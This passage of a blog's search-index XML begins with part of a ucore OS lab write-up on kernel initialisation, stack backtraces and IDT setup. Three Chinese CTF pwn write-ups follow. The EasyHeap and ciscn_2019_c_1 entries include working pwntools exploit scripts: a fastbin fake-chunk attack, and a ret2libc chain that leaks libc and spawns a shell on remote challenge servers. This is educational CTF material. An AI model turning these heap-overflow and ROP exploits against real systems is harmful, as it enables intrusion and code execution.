class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">kern_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((noreturn))</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">grade_backtrace</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">lab1_switch_test</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br> <br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 内核入口 总控函数</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-function"><span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">kern_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;<br>    <span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> edata[], end[];<br>    <span class="hljs-built_in">memset</span>(edata, <span class="hljs-number">0</span>, end - edata);<br> <br>    <span class="hljs-comment">// 初始化控制台(控制显卡交互)，只有设置好了对显卡的控制后，std_out输出的信息（例如cprintf）才能显示在控制台中</span><br>    <span class="hljs-built_in">cons_init</span>();                <span class="hljs-comment">// init the console</span><br> <br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *message = <span class="hljs-string">&quot;(THU.CST) os is loading ...&quot;</span>;<br>    <span class="hljs-built_in">cprintf</span>(<span class="hljs-string">&quot;%s\n\n&quot;</span>, message);<br> <br>    <span class="hljs-built_in">print_kerninfo</span>();<br> <br>    <span class="hljs-built_in">grade_backtrace</span>();<br> <br>    <span class="hljs-comment">// 初始化物理内存管理器</span><br>    <span class="hljs-built_in">pmm_init</span>();                 <span class="hljs-comment">// init physical memory management</span><br> <br>    <span class="hljs-comment">// 初始化中断控制器</span><br>    <span class="hljs-built_in">pic_init</span>();                 <span class="hljs-comment">// init interrupt controller</span><br>    <span class="hljs-comment">// 初始化中断描述符表</span><br>    <span class="hljs-built_in">idt_init</span>();                 <span class="hljs-comment">// init interrupt descriptor table</span><br> <br>    <span class="hljs-comment">// 初始化定时芯片</span><br>    <span class="hljs-built_in">clock_init</span>();               <span class="hljs-comment">// init clock interrupt</span><br>    <span class="hljs-comment">// 开中断</span><br>    <span class="hljs-built_in">intr_enable</span>();              <span class="hljs-comment">// enable irq interrupt</span><br> <br>    <span class="hljs-comment">//LAB1: CAHLLENGE 1 If you try to do it, uncomment lab1_switch_test()</span><br>    <span class="hljs-comment">// user/kernel mode switch test</span><br>    <span class="hljs-built_in">lab1_switch_test</span>();<br> <br>    <span class="hljs-comment">/* do nothing */</span><br>    <span class="hljs-comment">// 陷入死循环，避免内核程序退出。通过监听中断事件进行服务</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p> 从kern_init函数的代码中可以看出，其依次完成了如下的几个主要工作：</p><ol><li><strong>cons_init</strong> 初始化控制台(控制显卡交互)</li><li><strong>pmm_init</strong> 初始化物理内存管理器(lab1中里面暂时只是完成了GDT的重新设置，比较简单。而在lab2的物理内存管理的实现中，<strong>pmm_init</strong>才成为主角)</li><li><strong>pic_init</strong>初始化中断控制器(内部通过与8259A中断控制器芯片进行交互，令ucore能够接收到来自硬件的各种中断请求)</li><li><strong>idt_init</strong>初始化中断描述符表(在下面的中断机制一节中详细介绍)</li><li><strong>clock_init</strong> 初始化定时器(进行8253定时器的相关设置，将其设置为10ms发起一次时钟中断)</li><li><strong>intr_enable</strong> 完成了内核结构的初始化后，开启中断，至此ucore内核正式开始运行</li></ol><p>在练习5与练习6中，主要了解的就是ucore的中断机制。用户态写下的程序需要调用系统函数，就需要用到中断，来暂时的从用户态变为内核态，调用完函数后重新返回至用户态</p><h1 id="练习5：-补充kdebug-c中函数print-stackframe"><a href="#练习5：-补充kdebug-c中函数print-stackframe" class="headerlink" title="练习5： 补充kdebug.c中函数print_stackframe"></a><strong>练习5： 补充kdebug.c中函数print_stackframe</strong></h1><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">void<br>print_stackframe(void) &#123;<br>     <span class="hljs-comment">/* LAB1 YOUR CODE : STEP 1 */</span><br>     <span class="hljs-comment">/* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);</span><br><span class="hljs-comment">      * (2) call read_eip() to get the value of eip. the type is (uint32_t);</span><br><span class="hljs-comment">      * (3) from 0 .. STACKFRAME_DEPTH</span><br><span class="hljs-comment">      *    (3.1) printf value of ebp, eip</span><br><span class="hljs-comment">      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (unit32_t)ebp +2 [0..4]</span><br><span class="hljs-comment">      *    (3.3) cprintf(&quot;\n&quot;);</span><br><span class="hljs-comment">      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.</span><br><span class="hljs-comment">      *    (3.5) popup a calling stackframe</span><br><span class="hljs-comment">      *           NOTICE: the calling funciton&#x27;s return addr eip  = ss:[ebp+4]</span><br><span class="hljs-comment">      *                   the calling funciton&#x27;s ebp = ss:[ebp]</span><br><span class="hljs-comment">      */</span><br>    uint32_t ebp = read_ebp(), <span class="hljs-keyword">eip </span>= read_eip()<span class="hljs-comment">;#读取ebp，eip的值，具体函数在这个程序中已经为我们封装好了</span><br> <br>    int i, <span class="hljs-keyword">j;</span><br><span class="hljs-keyword"></span>    for (i = <span class="hljs-number">0</span><span class="hljs-comment">; ebp != 0 &amp;&amp; i &lt; STACKFRAME_DEPTH; i ++) &#123; #开始循环，程序中已经为我们算出了栈帧的深度</span><br>        cprintf(<span class="hljs-string">&quot;ebp:0x%08x eip:0x%08x args:&quot;</span>, ebp, <span class="hljs-keyword">eip);#打印出当前ebp，和eip的值</span><br><span class="hljs-keyword"></span>        uint32_t *args = (uint32_t *)ebp + <span class="hljs-number">2</span><span class="hljs-comment">;            #args代表的是栈帧中ebp下方的参数 被保存的一些原函数的值</span><br>        for (<span class="hljs-keyword">j </span>= <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; 4; j ++) &#123;</span><br>            cprintf(<span class="hljs-string">&quot;0x%08x &quot;</span>, args[<span class="hljs-keyword">j]); </span>                 <span class="hljs-comment">#打印ebp之后的四个参数</span><br>        &#125;<br>        cprintf(<span class="hljs-string">&quot;\n&quot;</span>);<br>        print_debuginfo(<span class="hljs-keyword">eip </span>- <span class="hljs-number">1</span>);          <br>        <span class="hljs-keyword">eip </span>= ((uint32_t *)ebp)[<span class="hljs-number">1</span>]<span class="hljs-comment">;              #ebp[1] ebp的下一位，指向的是返回地址，即eip的迭代</span><br>        ebp = ((uint32_t *)ebp)[<span class="hljs-number">0</span>]<span class="hljs-comment">;             # ebp[0] 即ebp的所指向的旧的ebp的值</span><br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><h3 id="ucore中断功能的组成部分（取经）"><a href="#ucore中断功能的组成部分（取经）" class="headerlink" title="ucore中断功能的组成部分（取经）"></a>ucore中断功能的组成部分（取经）</h3><p>　　<strong>ucore的中断工作机制大致可以分为以下几个部分：</strong></p><p>　　1. IDT中断描述符表的建立</p><p>　　2. 中断栈帧的生成</p><p>　　3. 接收到中断栈帧，通过对应的中断服务例程进行处理</p><p>　　4. 中断服务例程处理完毕，中断返回</p><h1 id="练习6：完善中断初始化和处理："><a href="#练习6：完善中断初始化和处理：" class="headerlink" title="练习6：完善中断初始化和处理："></a><strong>练习6：完善中断初始化和处理：</strong></h1><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * Interrupt descriptor table:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be built at run time because shifted function addresses can&#x27;t</span><br><span class="hljs-comment"> * be represented in relocation records.</span><br><span class="hljs-comment"> * */</span><br>static <span class="hljs-keyword">struct</span> gatedesc idt<span class="hljs-literal">[<span class="hljs-number">256</span>]</span> = &#123;&#123;<span class="hljs-number">0</span>&#125;&#125;;<br> <br>static <span class="hljs-keyword">struct</span> pseudodesc idt_pd = &#123;<br>    sizeof(idt) - <span class="hljs-number">1</span>, (uintptr_t)idt<br>&#125;;<br> <br><span class="hljs-comment">/* idt_init - initialize IDT to each of the entry points in kern/trap/vectors.S */</span><br>void<br>idt<span class="hljs-constructor">_init(<span class="hljs-params">void</span>)</span> &#123;<br>     <span class="hljs-comment">/* LAB1 YOUR CODE : STEP 2 */</span><br>     <span class="hljs-comment">/* (1) Where are the entry addrs of each Interrupt Service Routine (ISR)?</span><br><span class="hljs-comment">      *     All ISR&#x27;s entry addrs are stored in __vectors. where is uintptr_t __vectors[] ?</span><br><span class="hljs-comment">      *     __vectors[] is in kern/trap/vector.S which is produced by tools/vector.c</span><br><span class="hljs-comment">      *     (try &quot;make&quot; command in lab1, then you will find vector.S in kern/trap DIR)</span><br><span class="hljs-comment">      *     You can use  &quot;extern uintptr_t __vectors[];&quot; to define this extern variable which will be used later.</span><br><span class="hljs-comment">      * (2) Now you should setup the entries of ISR in Interrupt Description Table (IDT).</span><br><span class="hljs-comment">      *     Can you see idt[256] in this file? Yes, it&#x27;s IDT! you can use SETGATE macro to setup each item of IDT</span><br><span class="hljs-comment">      * (3) After setup the contents of IDT, you will let CPU know where is the IDT by using &#x27;lidt&#x27; instruction.</span><br><span class="hljs-comment">      *     You don&#x27;t know the meaning of this instruction? just google it! and check the libs/x86.h to know more.</span><br><span class="hljs-comment">      *     Notice: the argument of lidt is idt_pd. try to find it!</span><br><span class="hljs-comment">      */</span><br>    extern uintptr_t __vectors<span class="hljs-literal">[]</span>;<br>    <span class="hljs-built_in">int</span> i;<br>    <span class="hljs-comment">// 首先通过tools/vector.c通过程序生成/kern/trap/verctor.S,并在加载内核时对之前已经声明的全局变量__vectors进行整体的赋值</span><br>    <span class="hljs-comment">// __vectors数组中的每一项对应于中断描述符的中断服务例程的入口地址，在SETGATE宏的使用中可以体现出来</span><br>    <span class="hljs-comment">// 将__vectors数组中每一项关于中断描述符的描述设置到下标相同的idt中，通过宏SETGATE构造出最终的中断描述符结构</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sizeof(idt)<span class="hljs-operator"> / </span>sizeof(<span class="hljs-keyword">struct</span> gatedesc); i ++) &#123;<br>        <span class="hljs-comment">// 遍历idt数组，将其中的内容(中断描述符)设置进IDT中断描述符表中(默认的DPL特权级都是内核态DPL_KERNEL=0)</span><br>        <span class="hljs-constructor">SETGATE(<span class="hljs-params">idt</span>[<span class="hljs-params">i</span>], 0, GD_KTEXT, <span class="hljs-params">__vectors</span>[<span class="hljs-params">i</span>], DPL_KERNEL)</span>;<br>    &#125;<br>    <span class="hljs-comment">// set for switch from user to kernel</span><br>    <span class="hljs-comment">// 用户态与内核态的互相转化是通过中断实现的，单独为其一个中断描述符</span><br>    <span class="hljs-comment">// 由于需要允许用户态的程序访问使用该中断，DPL特权级为用户态DPL_USER=3</span><br>    <span class="hljs-constructor">SETGATE(<span class="hljs-params">idt</span>[T_SWITCH_TOK], 0, GD_KTEXT, <span class="hljs-params">__vectors</span>[T_SWITCH_TOK], DPL_USER)</span>;<br>    <span class="hljs-comment">// load the IDT 令IDTR中断描述符表寄存器指向idt_pd，加载IDT</span><br>    <span class="hljs-comment">// idt_pd结构体中的前16位为描述符表的界限，pd_base指向之前完成了赋值操作的idt数组的起始位置</span><br>    lidt(&amp;idt_pd);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？："><a href="#中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？：" class="headerlink" title="中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？："></a><strong>中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？：</strong></h2><p> 中断向量表一个表项占用8字节，其中2-3字节是段选择子，0-1字节和6-7字节拼成位移，两者联合便是中断处理程序的入口地址。</p><p><a href="https://www.cnblogs.com/xiaoxiongcanguan/p/13714587.html">部分内容借鉴</a></p><p>初次学习，在这个博客中也学到了不少的内容，补充了一些课上并没有的东西。</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
      <category>ucore</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>roarctf_2019_easy_pwn</title>
    <link href="/2021/07/29/roarctf_2019_easy_pwn/"/>
    <url>/2021/07/29/roarctf_2019_easy_pwn/</url>
    
    <content type="html"><![CDATA[<p>白天睡觉，晚上来写道题。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题涉及了unsortedbins，malloc_hook，堆溢出。</p><p>heap的菜单选项常规题，做到目前为止，主要是两个思路：</p><p>先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。</p><p>在create函数中可以明显看出来这是个结构体</p><p><img src="/img/roarctf_2019_easy_pwn-1.png" alt="roarctf_2019_easy_pwn-1"></p><p>一个结构体有24个字节，前8个为标志位，中间8个size位，后8个是alloc出来的chunk的指针。</p><p>（alloc和malloc不同的是 alloc的free后会清空用户数据区）</p><p>其中a1 为基地址，我一开始还打算去找这个a1，</p><p>但是看到这个a1的初始化。</p><p><img src="/img/roarctf_2019_easy_pwn-2.png" alt="roarctf_2019_easy_pwn-2"></p><p>这里面buf是随机数字，所以a1搜寻未果。</p><p><img src="/img/roarctf_2019_easy_pwn-3.png" alt="roarctf_2019_easy_pwn-3"></p><p>fill函数中，没有根据chunk的大小来限制写入大小。所以存在着溢出漏洞。</p><p>主要思路就是，根据unsorted bin 中的fd。利用main_arean泄露libc（这个还没有查阅资料）</p><p>然后利用之前布置好的盖在小块的大块来dump出来。</p><p>接下来是漏洞利用。钩子函数详细，可以查阅这个资料<br><a href="https://blog.csdn.net/qq_41453285/article/details/99315504">https://blog.csdn.net/qq_41453285/article/details/99315504</a></p><p>里面介绍的很清晰，具体思路就是，在钩子函数之前有一个为末位的一块内存区域，因为fastbin中没有对齐限制。所以我们可以修改fastbin中最后一个的fd指针，指向这里，让fastbin将它加入，然后在malloc一下，之后就可以通过溢出（具体溢出长度，上面那个资料中有详细的介绍）来修改malloc_hook 处的内容：malloc函数执行的时候会先检测__malloc_hook是否为空，如果不为空就执行__mallochook。所以这时候把malloc_hook 修改为一个one_gadget的地址（好像是存在这几个固定的地址。只需要libc的基地址加上这个偏移）</p><p>那么最后再malloc一个chunk就可以触发 one_gadget。</p><p>果然还是多做题才能多涨姿势。</p><p>但是套路应该就是这几个套路了。</p><p>难题可能在泄露libc上下难度，目前我觉得应该就是这几个套路了，后续继续学习新的漏洞利用手段。</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ZJCTF2019-EasyHeap</title>
    <link href="/2021/07/27/ZJCTF2019-EasyHeap/"/>
    <url>/2021/07/27/ZJCTF2019-EasyHeap/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/ZJCTF2019-EasyHeap-1.png" alt="[ZJCTF 2019]EasyHeap-1"></p><p> 做题先check找攻击手段，Partial RELRP -&gt; 修改got表</p><p><img src="/img/ZJCTF2019-EasyHeap-2.png" alt="[ZJCTF 2019]EasyHeap-2"></p><p>菜单题，直接找准delete看看有没有UAF。</p><p><img src="/img/ZJCTF2019-EasyHeap-3.png" alt="[ZJCTF 2019]EasyHeap-3"></p><p>UAF未果。</p><p><img src="/img/ZJCTF2019-EasyHeap-4.png" alt="[ZJCTF 2019]EasyHeap-4"></p><p>但是在Edit_heap中存在漏洞。</p><p>这里看起来是以为可以修改heap的size，其实这个size是用来对你的输入进行限制的。（<a href="https://so.csdn.net/so/search?q=%E6%A0%88%E6%BA%A2%E5%87%BA&spm=1001.2101.3001.7020">栈溢出</a>就在这里把size写的很大，方便我们写入）</p><p><img src="/img/ZJCTF2019-EasyHeap-5.png" alt="[ZJCTF 2019]EasyHeap-5"></p><p>而且这个程序写的会让你修改chunk的信息域</p><p>所以 wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;26279&quot;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)   <span class="hljs-comment">#create 0 heap</span><br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;96\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)   <span class="hljs-comment">#create 1 heap</span><br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;96\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3\n&#x27;</span>)   <span class="hljs-comment"># free 1</span><br>sh.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)<br>x = p64(<span class="hljs-number">0x0</span>) * <span class="hljs-number">13</span> + p64(<span class="hljs-number">0x71</span>)  + p64(<span class="hljs-number">0x6020ad</span>) + p64(<span class="hljs-number">0x0</span>)  <span class="hljs-comment">#create fake chunk</span><br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-string">&#x27;0\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;1000\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,x)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)      <span class="hljs-comment">#create 1 heap</span><br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;96\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/BengDouLove/article/details/105391153?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162731259516780271593086%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162731259516780271593086&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-105391153.first_rank_v2_pc_rank_v29&utm_term=BUUCTF+%5BZJCTF+2019%5DEasyHeap&spm=1018.2226.3001.4187">参考链接</a></p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_c_1</title>
    <link href="/2021/05/25/ciscn_2019_c_1/"/>
    <url>/2021/05/25/ciscn_2019_c_1/</url>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/img/ciscn_2019_c_1-1.png"></p><p>F5反汇编main函数后，会让我们选择函数。我们注意到</p><p><img src="/img/ciscn_2019_c_1-2.png"></p><p>encrypt函数中存在着gets(s) 栈溢出漏洞。</p><p>但是并没有存在system函数，所以我们不能直接利用。</p><p>所以我们要用ret2libc技术，先考虑泄露libc基地址。</p><p>在mian和encrypt函数中都出现了puts函数</p><p>我们知道根据延迟绑定技术：</p><p><em>plt表中的函数如果没有被调用过，那么got表中该函数的对应项则指向plt表的第二行指令。当完成了第一次调用后，got表中会存放函数的真实地址，plt表这时候只起到调用的作用。</em></p><h1 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h1><p>所以，puts函数既被函数调用了，又可以输出一些东西，可以成为我们ret2libc技术的好帮手。</p><p>所以我们第一个payload1应该是</p><p><code>payload1=b&quot;a&quot;*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</code></p><p>第一次写，我可能写的比较啰嗦</p><p>记一下笔记：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. ‘a&#x27;*<span class="hljs-number">88</span>前加b的原因是 py3中 char类型想要用+拼接要加上b强制转换。<br><span class="hljs-attribute">2</span>. pop_rdi_addr  是因为在x64中，函数调用优先使用寄存器。超过<span class="hljs-number">6</span>个参数后才使用栈传参。<br><span class="hljs-attribute">3</span>. puts_got是把puts函数的真实地址传递给rdi<br><span class="hljs-attribute">4</span>. puts_plt用于作为返回地址调用函数<br><span class="hljs-attribute">5</span>. 最后我们再次进入整个程序。<br></code></pre></td></tr></table></figure><p>接下来我们提交过后需要接收puts函数的真实位置，再根据libc不同版本下puts函数的偏移，来计算出libc基地址。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-selector-attr">[:-1]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\0&#x27;</span>))`<br><br><span class="hljs-selector-attr">[:-1]</span>代表的是取该行字符串除去最后一个字符外的字符串。（可能是因为最后一个字符是个换行符）<br><br><span class="hljs-function"><span class="hljs-title">ljust</span><span class="hljs-params">(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\0&#x27;</span>)</span></span>的意思是 接收<span class="hljs-number">8</span>个字符，再加上\<span class="hljs-number">0</span> 成为一个字符串<br></code></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>接下来暴露了libc地址，就是简单的rop了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br>context.<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">ru</span>=lambda x:io.recvuntil(x)<br><span class="hljs-attribute">rl</span>=lambda :io.recvline()<br><span class="hljs-attribute">sla</span>=lambda x,y:io.sendlineafter(x,y)<br><span class="hljs-attribute">io</span>=remote(&#x27;node3.buuoj.cn&#x27;,******)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./ciscn_2019_c_1&#x27;)<br><span class="hljs-attribute">ret</span>=0x4006b9<br><span class="hljs-attribute">pop_rdi</span>=0x400c83<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-attribute">payload</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>sla(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>rl()<br>rl()<br><span class="hljs-attribute">puts</span>=u64(ru(&#x27;\n&#x27;)[:-1].ljust(8,b<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;puts&#x27;,puts)<br><span class="hljs-attribute">libc_addr</span>=puts-libc.dump(&#x27;puts&#x27;)<br><span class="hljs-attribute">binsh</span>=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">system</span>=libc_addr+libc.dump(&#x27;system&#x27;)<br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-attribute">payload</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>sla(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>stack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
